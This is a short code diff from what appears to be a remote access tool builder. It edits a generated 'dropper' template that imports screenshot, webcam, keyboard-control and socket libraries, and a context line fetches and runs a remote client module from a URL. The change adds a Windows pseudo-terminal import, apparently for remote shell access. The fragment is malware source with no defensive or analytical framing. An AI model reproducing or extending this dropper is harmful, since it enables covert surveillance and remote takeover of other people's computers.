@@ -273,6 +273,8 @@ create_moduel(url+"client/client.py").run(url, file_path)"""
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl,cv2,os
 from PIL import Image
 from urllib.request import urlopen
+if os.name == 'nt':
+    import winpty
 
 try:
     import pyautogui
